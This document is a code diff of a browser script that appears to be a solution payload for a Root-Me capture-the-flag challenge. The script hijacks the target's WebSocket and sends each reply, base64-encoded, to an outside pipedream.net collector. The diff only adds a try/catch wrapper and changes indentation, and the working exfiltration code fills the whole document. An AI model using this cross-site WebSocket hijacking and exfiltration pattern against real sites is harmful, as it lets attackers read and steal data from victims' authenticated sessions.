@@ -1,25 +1,31 @@
 <script>
     let v = open("http://ctf22.root-me.org/room");
     fetch('https://eocvkn4m3kpce3q.m.pipedream.net?cyka', {mode: 'no-cors'});
-  setTimeout(() => {
+    try {
+      setTimeout(() => {
     var websocket = new WebSocket('ws://ctf22.root-me.org/ws');
     websocket.onopen = start;
-  websocket.onmessage = handleReply;
-  websocket.onerror = function (error) {
-      fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error='+error, {mode: 'no-cors'});
-      location.reload()
-    };
-    websocket.onclose = function(message) {
-        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?message='+message, {mode: 'no-cors'});
-    }
+      websocket.onmessage = handleReply;
+      websocket.onerror = function (error) {
+          fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error='+error, {mode: 'no-cors'});
+          location.reload()
+        };
+        websocket.onclose = function(message) {
+            fetch('https://eocvkn4m3kpce3q.m.pipedream.net?message='+message, {mode: 'no-cors'});
+        }
+    
+      function start(event) {
+        websocket.send("hello");
+      }
+      function handleReply(event) {
+        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+btoa(event.data), {mode: 'no-cors'})
+      }
 
-  function start(event) {
-    websocket.send("hello");
-  }
-  function handleReply(event) {
-    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+btoa(event.data), {mode: 'no-cors'})
-  }
+    }, 1000)
+}
+catch (e) {
+    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error='+e, {mode: 'no-cors'});
+}
 
-}, 1000)
 
 </script>
